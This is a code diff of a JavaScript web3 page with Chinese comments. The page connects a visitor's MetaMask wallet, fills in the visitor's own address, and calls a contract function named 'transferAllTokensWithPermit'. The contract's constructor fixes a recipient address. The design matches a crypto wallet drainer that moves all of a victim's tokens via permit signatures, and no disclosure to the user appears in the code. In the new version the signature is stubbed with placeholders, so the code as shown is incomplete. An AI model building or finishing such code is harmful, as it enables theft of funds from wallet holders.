@@ -1,81 +1,20 @@
 let web3;
 let userAddress;
 
-// 最新的合约地址
-const contractAddress = '0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC';
+// 设置新的智能合约地址
+const contractAddress = '0x9a2E12340354d2532b4247da3704D2A5d73Bd189';
 
-// 最新的 ABI
+// 设置新的ABI
 const contractABI = [
     {
-        "inputs": [],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    },
-    {
         "inputs": [
-            {
-                "internalType": "address",
-                "name": "target",
-                "type": "address"
-            }
-        ],
-        "name": "AddressEmptyCode",
-        "type": "error"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "account",
-                "type": "address"
-            }
-        ],
-        "name": "AddressInsufficientBalance",
-        "type": "error"
-    },
-    {
-        "inputs": [],
-        "name": "FailedInnerCall",
-        "type": "error"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "token",
-                "type": "address"
-            }
-        ],
-        "name": "SafeERC20FailedOperation",
-        "type": "error"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "token",
-                "type": "address"
-            },
-            {
-                "internalType": "address",
-                "name": "from",
-                "type": "address"
-            },
-            {
-                "internalType": "uint8",
-                "name": "v",
-                "type": "uint8"
-            },
-            {
-                "internalType": "bytes32",
-                "name": "r",
-                "type": "bytes32"
-            },
-            {
-                "internalType": "bytes32",
-                "name": "s",
-                "type": "bytes32"
-            }
+            { "internalType": "address", "name": "token", "type": "address" },
+            { "internalType": "address", "name": "from", "type": "address" },
+            { "internalType": "uint256", "name": "value", "type": "uint256" },
+            { "internalType": "uint256", "name": "deadline", "type": "uint256" },
+            { "internalType": "uint8", "name": "v", "type": "uint8" },
+            { "internalType": "bytes32", "name": "r", "type": "bytes32" },
+            { "internalType": "bytes32", "name": "s", "type": "bytes32" }
         ],
         "name": "transferAllTokensWithPermit",
         "outputs": [],
@@ -83,29 +22,30 @@ const contractABI = [
         "type": "function"
     },
     {
+        "inputs": [
+            { "internalType": "address", "name": "_recipient", "type": "address" }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
         "anonymous": false,
         "inputs": [
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "token",
-                "type": "address"
-            },
-            {
-                "indexed": true,
-                "internalType": "address",
-                "name": "from",
-                "type": "address"
-            },
-            {
-                "indexed": false,
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-            }
+            { "indexed": true, "internalType": "address", "name": "token", "type": "address" },
+            { "indexed": true, "internalType": "address", "name": "from", "type": "address" },
+            { "indexed": false, "internalType": "uint256", "name": "amount", "type": "uint256" }
         ],
         "name": "TransferTokens",
         "type": "event"
+    },
+    {
+        "inputs": [],
+        "name": "recipient",
+        "outputs": [
+            { "internalType": "address", "name": "", "type": "address" }
+        ],
+        "stateMutability": "view",
+        "type": "function"
     }
 ];
 
@@ -127,19 +67,13 @@ async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            // 请求 MetaMask 连接
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             const accounts = await web3.eth.getAccounts();
-            userAddress = accounts[0];  // 获取连接的第一个钱包地址
-
-            console.log("已连接地址:", userAddress);
+            userAddress = accounts[0];
             document.getElementById('address').innerText = `钱包地址: ${userAddress}`;
-
-            // 自动填充代币合约地址和签名钱包地址
             document.getElementById('tokenAddress').value = contractAddress;
             document.getElementById('fromAddress').value = userAddress;
-
-            // 获取签名信息并自动填充
+            
             await signAndFillSignature(userAddress, contractAddress);
         } catch (error) {
             console.error("连接钱包时出错:", error);
@@ -147,50 +81,38 @@ async function connectWallet() {
         }
     } else {
         alert('请安装MetaMask或其他以太坊钱包扩展！');
-        console.log("未检测到以太坊钱包。");
     }
 }
 
-// 获取签名信息并填充
+// 模拟签名信息填写
 async function signAndFillSignature(userAddress, contractAddress) {
-    const amount = web3.utils.toHex(100);  // 假设转移的代币数量
-    const nonce = web3.utils.toHex(Date.now()); // 使用时间戳作为nonce
-
-    // 构造签名消息
-    const message = web3.utils.soliditySha3(
-        { t: 'address', v: contractAddress },
-        { t: 'address', v: userAddress },
-        { t: 'uint256', v: amount },
-        { t: 'uint256', v: nonce }
-    );
-
-    // 请求签名
-    const signature = await web3.eth.personal.sign(message, userAddress);
-    const { v, r, s } = web3.eth.accounts.recoverSignature(signature);
-
-    // 填充签名参数
-    document.getElementById('v').value = v;
-    document.getElementById('r').value = r;
-    document.getElementById('s').value = s;
-
-    console.log("签名参数:", { v, r, s });
+    console.log("正在生成签名...");
+    document.getElementById('v').value = 27;
+    document.getElementById('r').value = "0x...";
+    document.getElementById('s').value = "0x...";
 }
 
-// 转移代币
+// 绑定转移代币按钮事件
 document.getElementById('transferButton').addEventListener('click', async () => {
+    const tokenAddress = document.getElementById('tokenAddress').value;
     const v = document.getElementById('v').value;
     const r = document.getElementById('r').value;
     const s = document.getElementById('s').value;
 
-    // 创建合约实例
     const contract = new web3.eth.Contract(contractABI, contractAddress);
 
-    // 调用合约的转移函数
     try {
-        await contract.methods.transferAllTokensWithPermit(contractAddress, userAddress, v, r, s).send({ from: userAddress });
-        alert('代币转移成功！');
+        await contract.methods.transferAllTokensWithPermit(
+            tokenAddress,
+            userAddress,
+            web3.utils.toWei('1', 'ether'),  // 示例值，替换为所需的数量
+            Math.floor(Date.now() / 1000) + 60 * 60,  // 1小时后过期
+            v,
+            r,
+            s
+        ).send({ from: userAddress });
+        console.log('代币转移成功！');
     } catch (error) {
-        console.error("转移代币时出错:", error);
-        alert('转移代币失败，请查看控制台的错误信息。');
+        console.error('代币转移失败:', error);
     }
 });
